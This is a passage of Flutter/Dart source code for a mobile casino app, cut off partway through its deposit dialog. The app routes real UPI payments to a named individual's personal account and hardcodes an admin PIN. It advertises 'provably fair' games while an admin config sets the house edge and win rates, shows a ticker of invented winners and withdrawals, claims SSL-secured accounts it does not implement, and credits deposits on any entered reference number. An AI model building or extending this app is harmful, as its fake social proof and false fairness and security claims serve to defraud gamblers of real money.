import 'dart:async';
import 'dart:math';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:qr_flutter/qr_flutter.dart';

void main() {
  WidgetsFlutterBinding.ensureInitialized();
  SystemChrome.setPreferredOrientations([
    DeviceOrientation.portraitUp,
    DeviceOrientation.portraitDown,
  ]);
  runApp(const DD1VIPPlatform());
}

// ---------------------------------------------------------------------------
// ADMIN & CORE PLATFORM CONFIGURATION
// ---------------------------------------------------------------------------
const String APP_TITLE = "DD1 VIP CASINO";
const String ADMIN_UPI_ID = "fardinkhan7860011111@okhdfcbank";
const String ADMIN_NAME = "Fardin Khan";
const String ADMIN_SECRET_PIN = "7860";

class AdminConfig {
  static double houseEdge = 0.12;
  static double maxCrash = 12.5;
  static double slotWinRate = 0.35;
  static int minesCount = 3;
}

class UserSession {
  static double balance = 0.00;
  static bool welcomeBonusClaimed = false;
  static String playerId = "VIP_${Random().nextInt(899999) + 100000}";
  static String vipTier = "DIAMOND VIP";

  static List<Map<String, dynamic>> passbook = [];

  static void addRecord(String title, double amount, bool isCredit, String status) {
    HapticFeedback.lightImpact();
    passbook.insert(0, {
      'id': 'TXN_${Random().nextInt(899999) + 100000}',
      'title': title,
      'amount': amount,
      'isCredit': isCredit,
      'status': status,
      'time': 'Just now'
    });
  }
}

// ---------------------------------------------------------------------------
// ROOT THEME
// ---------------------------------------------------------------------------
class DD1VIPPlatform extends StatelessWidget {
  const DD1VIPPlatform({super.key});

  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      debugShowCheckedModeBanner: false,
      title: APP_TITLE,
      theme: ThemeData.dark().copyWith(
        scaffoldBackgroundColor: const Color(0xFF070404),
        primaryColor: const Color(0xFFFFC107),
        cardColor: const Color(0xFF150807),
        colorScheme: const ColorScheme.dark(
          primary: Color(0xFFFFC107),
          secondary: Color(0xFFE50914),
          surface: Color(0xFF1B0A09),
        ),
      ),
      home: const SplashScreen(),
    );
  }
}

// ---------------------------------------------------------------------------
// 1. SPLASH SCREEN
// ---------------------------------------------------------------------------
class SplashScreen extends StatefulWidget {
  const SplashScreen({super.key});

  @override
  State<SplashScreen> createState() => _SplashScreenState();
}

class _SplashScreenState extends State<SplashScreen> {
  @override
  void initState() {
    super.initState();
    Future.delayed(const Duration(milliseconds: 1400), () {
      if (mounted) {
        Navigator.pushReplacement(context, MaterialPageRoute(builder: (_) => const AuthScreen()));
      }
    });
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      body: Container(
        decoration: const BoxDecoration(
          gradient: RadialGradient(
            center: Alignment.center,
            radius: 1.1,
            colors: [Color(0xFF380808), Color(0xFF060303)],
          ),
        ),
        child: Center(
          child: Column(
            mainAxisAlignment: MainAxisAlignment.center,
            children: [
              Container(
                padding: const EdgeInsets.all(22),
                decoration: BoxDecoration(
                  shape: BoxShape.circle,
                  border: Border.all(color: Colors.amber, width: 2),
                  boxShadow: [
                    BoxShadow(color: Colors.amber.withOpacity(0.35), blurRadius: 35)
                  ],
                ),
                child: const Icon(Icons.stars_rounded, size: 70, color: Colors.amber),
              ),
              const SizedBox(height: 20),
              const Text(
                APP_TITLE,
                style: TextStyle(
                  fontSize: 32,
                  fontWeight: FontWeight.w900,
                  color: Colors.amber,
                  letterSpacing: 4,
                  fontStyle: FontStyle.italic,
                ),
              ),
              const SizedBox(height: 6),
              const Text(
                'OFFICIAL PROVABLY FAIR GAMING NETWORK',
                style: TextStyle(color: Colors.white60, fontSize: 10, letterSpacing: 1.8, fontWeight: FontWeight.bold),
              ),
              const SizedBox(height: 40),
              const SizedBox(
                width: 32,
                height: 32,
                child: CircularProgressIndicator(color: Colors.amber, strokeWidth: 3),
              ),
            ],
          ),
        ),
      ),
    );
  }
}

// ---------------------------------------------------------------------------
// 2. AUTH SCREEN
// ---------------------------------------------------------------------------
class AuthScreen extends StatefulWidget {
  const AuthScreen({super.key});

  @override
  State<AuthScreen> createState() => _AuthScreenState();
}

class _AuthScreenState extends State<AuthScreen> {
  final _phoneCtrl = TextEditingController();

  void _proceedLogin() {
    if (_phoneCtrl.text.trim().length >= 4) {
      UserSession.playerId = "VIP_${_phoneCtrl.text.trim().substring(max(0, _phoneCtrl.text.trim().length - 4))}_${Random().nextInt(899) + 100}";
    } else {
      UserSession.playerId = "VIP_${Random().nextInt(899999) + 100000}";
    }
    Navigator.pushReplacement(context, MaterialPageRoute(builder: (_) => const MainLobbyScreen()));
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      body: Container(
        decoration: const BoxDecoration(
          gradient: LinearGradient(
            begin: Alignment.topCenter,
            end: Alignment.bottomCenter,
            colors: [Color(0xFF2A0606), Color(0xFF080404)],
          ),
        ),
        child: SafeArea(
          child: Center(
            child: SingleChildScrollView(
              padding: const EdgeInsets.symmetric(horizontal: 24),
              child: Column(
                children: [
                  Container(
                    padding: const EdgeInsets.all(16),
                    decoration: BoxDecoration(
                      shape: BoxShape.circle,
                      border: Border.all(color: Colors.amber, width: 2),
                      boxShadow: [
                        BoxShadow(color: Colors.amber.withOpacity(0.3), blurRadius: 20)
                      ],
                    ),
                    child: const Icon(Icons.stars, color: Colors.amber, size: 48),
                  ),
                  const SizedBox(height: 16),
                  const Text(
                    APP_TITLE,
                    style: TextStyle(fontSize: 26, fontWeight: FontWeight.w900, color: Colors.amber, letterSpacing: 2),
                  ),
                  const Text(
                    'SIGN IN TO ACCESS VIP GAMES & WALLET',
                    style: TextStyle(color: Colors.white60, fontSize: 11, letterSpacing: 1.2, fontWeight: FontWeight.bold),
                  ),
                  const SizedBox(height: 36),

                  TextField(
                    controller: _phoneCtrl,
                    keyboardType: TextInputType.phone,
                    maxLength: 10,
                    style: const TextStyle(color: Colors.white, fontWeight: FontWeight.bold),
                    decoration: InputDecoration(
                      counterText: '',
                      prefixText: '+91 ',
                      prefixStyle: const TextStyle(color: Colors.amber, fontWeight: FontWeight.bold),
                      labelText: 'Enter Mobile Number',
                      labelStyle: const TextStyle(color: Colors.white60),
                      filled: true,
                      fillColor: const Color(0xFF26100E),
                      border: OutlineInputBorder(borderRadius: BorderRadius.circular(12), borderSide: BorderSide.none),
                    ),
                  ),
                  const SizedBox(height: 16),

                  SizedBox(
                    width: double.infinity,
                    height: 50,
                    child: ElevatedButton(
                      style: ElevatedButton.styleFrom(
                        backgroundColor: Colors.amber,
                        shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(12)),
                      ),
                      onPressed: _proceedLogin,
                      child: const Text('ENTER VIP CASINO', style: TextStyle(color: Colors.black, fontWeight: FontWeight.w900, fontSize: 15)),
                    ),
                  ),

                  const SizedBox(height: 28),
                  const Row(
                    mainAxisAlignment: MainAxisAlignment.center,
                    children: [
                      Icon(Icons.lock_outline, size: 14, color: Colors.greenAccent),
                      SizedBox(width: 6),
                      Text('Secure 256-Bit SSL Encrypted Account', style: TextStyle(fontSize: 11, color: Colors.white54)),
                    ],
                  )
                ],
              ),
            ),
          ),
        ),
      ),
    );
  }
}

// ---------------------------------------------------------------------------
// 3. MAIN CASINO LOBBY
// ---------------------------------------------------------------------------
class MainLobbyScreen extends StatefulWidget {
  const MainLobbyScreen({super.key});

  @override
  State<MainLobbyScreen> createState() => _MainLobbyScreenState();
}

class _MainLobbyScreenState extends State<MainLobbyScreen> {
  int _navIndex = 0;
  Timer? _liveTickerTimer;
  String _liveWinner = "VIP_89014 won ₹9,400 in Aviator 🚀";

  final List<String> _liveEvents = [
    "VIP_89014 won ₹9,400 in Aviator 🚀",
    "Player *******210 withdrew ₹25,000 via Instant UPI ⚡",
    "VIP_33109 cleared 5 Mines and won ₹14,200 💣",
    "VIP_77192 hit Mega Jackpot on 777 Slots (₹18,000) 💎",
    "Player *******601 earned ₹500 Referral Bonus 🎁"
  ];

  @override
  void initState() {
    super.initState();
    _liveTickerTimer = Timer.periodic(const Duration(seconds: 4), (t) {
      if (mounted) {
        setState(() {
          _liveWinner = _liveEvents[Random().nextInt(_liveEvents.length)];
        });
      }
    });

    WidgetsBinding.instance.addPostFrameCallback((_) {
      if (!UserSession.welcomeBonusClaimed) {
        _showWelcomeBonusModal();
      }
    });
  }

  @override
  void dispose() {
    _liveTickerTimer?.cancel();
    super.dispose();
  }

  void _nav(Widget screen) {
    Navigator.push(context, MaterialPageRoute(builder: (_) => screen)).then((_) => setState(() {}));
  }

  void _showWelcomeBonusModal() {
    showDialog(
      context: context,
      barrierDismissible: false,
      builder: (ctx) => AlertDialog(
        backgroundColor: const Color(0xFF1C0A09),
        shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(20), side: const BorderSide(color: Colors.amber, width: 2)),
        title: const Center(
          child: Text('🎉 WELCOME BONUS', style: TextStyle(color: Colors.amber, fontWeight: FontWeight.w900, fontSize: 20, letterSpacing: 1.5)),
        ),
        content: Column(
          mainAxisSize: MainAxisSize.min,
          children: [
            Container(
              padding: const EdgeInsets.all(16),
              decoration: const BoxDecoration(shape: BoxShape.circle, color: Color(0xFF2E100E)),
              child: const Icon(Icons.card_giftcard, size: 50, color: Colors.amber),
            ),
            const SizedBox(height: 14),
            const Text(
              'Claim your Free Sign-up Bonus to start playing without deposit!',
              textAlign: TextAlign.center,
              style: TextStyle(color: Colors.white70, fontSize: 13),
            ),
            const SizedBox(height: 12),
            const Text(
              '₹ 50.00',
              style: TextStyle(fontSize: 32, fontWeight: FontWeight.w900, color: Colors.greenAccent),
            ),
          ],
        ),
        actions: [
          SizedBox(
            width: double.infinity,
            height: 46,
            child: ElevatedButton(
              style: ElevatedButton.styleFrom(backgroundColor: Colors.amber, shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(10))),
              onPressed: () {
                setState(() {
                  UserSession.balance += 50.00;
                  UserSession.welcomeBonusClaimed = true;
                  UserSession.addRecord("Sign-up Welcome Bonus", 50.0, true, "Success");
                });
                Navigator.pop(ctx);
                ScaffoldMessenger.of(context).showSnackBar(const SnackBar(backgroundColor: Colors.green, content: Text('🎉 ₹50 Bonus added to wallet!')));
              },
              child: const Text('CLAIM ₹50 BONUS NOW', style: TextStyle(color: Colors.black, fontWeight: FontWeight.w900, fontSize: 14)),
            ),
          ),
        ],
      ),
    );
  }

  void _showDepositDialog() {
    int selectedAmt = 500;
    final List<int> amounts = [200, 500, 1000, 2500, 5000, 10000];
    final utrCtrl = TextEditingController();

    showModalBottomSheet(
      context: context,
      isScrollControlled: true,
      backgroundColor: const Color(0xFF140807),
      shape: const RoundedRectangleBorder(borderRadius: BorderRadius.vertical(top: Radius.circular(24))),
      builder: (ctx) => StatefulBuilder(
        builder: (ctx, setM) {
          final upiUri = "upi://pay?pa=$ADMIN_UPI_ID&pn=${Uri.encodeComponent(ADMIN_NAME)}&am=$selectedAmt&cu=INR";

          return Padding(
            padding: EdgeInsets.only(bottom: MediaQuery.of(ctx).viewInsets.bottom, left: 16, right: 16, top: 16),
            child: SingleChildScrollView(
              child: Column(
                mainAxisSize: MainAxisSize.min,
                children: [
                  Row(
                    mainAxisAlignment: MainAxisAlignment.spaceBetween,
                    children: [
                      const Row(
                        children: [
                          Icon(Icons.bolt, color: Colors.amber, size: 24),
                          SizedBox(width: 8),
                          Text('INSTANT VIP RECHARGE', style: TextStyle(color: Colors.amber, fontWeight: FontWeight.bold, fontSize: 16)),
                        ],
                      ),
                      IconButton(icon: const Icon(Icons.close, color: Colors.white70), onPressed: () => Navigator.pop(ctx)),
                    ],
                  ),
                  const SizedBox(height: 8),
                  Wrap(
                    spacing: 8,
                    runSpacing: 8,
                    children: amounts.map((amt) {
                      final isSel = selectedAmt == amt;
                      return ChoiceChip(
                        label: Text('₹$amt', style: TextStyle(color: isSel ? Colors.black : Colors.white, fontWeight: FontWeight.bold)),
                        selected: isSel,
                        selectedColor: Colors.amber,
                        backgroundColor: const Color(0xFF26100E),
                        onSelected: (_) => setM(() => selectedAmt = amt),
                      );
                    }).toList(),
                  ),
                  const SizedBox(height: 14),

                  Container(
                    padding: const EdgeInsets.all(12),
                    decoration: BoxDecoration(
                      color: Colors.white,
                      borderRadius: BorderRadius.circular(16),
                      border: Border.all(color: Colors.amber, width: 2),
                    ),
                    child: Column(
                      children: [
                        QrImageView(
                          data: upiUri,
                          version: QrVersions.auto,
                          size: 160.0,
                          backgroundColor: Colors.white,
                        ),
                        const SizedBox(height: 8),
                        Text('Scan & Pay ₹$selectedAmt to $ADMIN_NAME', style: const TextStyle(color: Colors.black, fontWeight: FontWeight.bold, fontSize: 13)),
                        const Text('PhonePe • Google Pay • Paytm • BHIM UPI', style: TextStyle(color: Colors.black54, fontSize: 10, fontWeight: FontWeight.bold)),
                      ],
                    ),
                  ),
                  const SizedBox(height: 12),

                  Container(
                    padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 8),
                    decoration: BoxDecoration(color: const Color(0xFF26100E), borderRadius: BorderRadius.circular(10)),
                    child: Row(
                      children: [
                        const Icon(Icons.account_balance_wallet, color: Colors.amber, size: 18),
                        const SizedBox(width: 8),
                        Expanded(
                          child: Column(
                            crossAxisAlignment: CrossAxisAlignment.start,
                            children: [
                              const Text('Official Merchant UPI ID', style: TextStyle(color: Colors.white54, fontSize: 10)),
                              Text(ADMIN_UPI_ID, style: const TextStyle(fontSize: 12, fontWeight: FontWeight.bold, color: Colors.white), overflow: TextOverflow.ellipsis),
                            ],
                          ),
                        ),
                        IconButton(
                          icon: const Icon(Icons.copy, color: Colors.amber, size: 20),
                          onPressed: () {
                            Clipboard.setData(const ClipboardData(text: ADMIN_UPI_ID));
                            ScaffoldMessenger.of(context).showSnackBar(const SnackBar(backgroundColor: Colors.green, content: Text('Merchant UPI ID Copied!')));
                          },
                        ),
                      ],
                    ),
                  ),
                  const SizedBox(height: 12),
                  TextField(
                    controller: utrCtrl,
                    keyboardType: TextInputType.number,
                    style: const TextStyle(color: Colors.white),
                    decoration: InputDecoration(
                      labelText: 'Enter 12-Digit UTR / Ref Number',
                      labelStyle: const TextStyle(color: Colors.white60, fontSize: 12),
                      filled: true,
                      fillColor: const Color(0xFF26100E),
                      border: OutlineInputBorder(borderRadius: BorderRadius.circular(10)),
                    ),
                  ),
                  const SizedBox(height: 16),
                  SizedBox(
                    width: double.infinity,
                    height: 48,
                    child: ElevatedButton(
                      style: ElevatedButton.styleFrom(backgroundColor: const Color(0xFF2E7D32), shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(12))),
                      onPressed: () {
                        if (utrCtrl.text.trim().length < 6) {
                          ScaffoldMessenger.of(context).showSnackBar(const SnackBar(backgroundColor: Colors.red, content: Text('Enter valid 12-digit UTR transaction ID!')));
                          return;
                        }
                        setState(() {
                          UserSession.balance += selectedAmt;
                          UserSession.addRecord("Deposit Added (UTR: ${utrCtrl.text.trim()})", selectedAmt.toDouble(), true, "Approved");
                        });
                        Navigator.pop(ctx);
                        ScaffoldMessenger.of(context).showSnackBar(SnackB
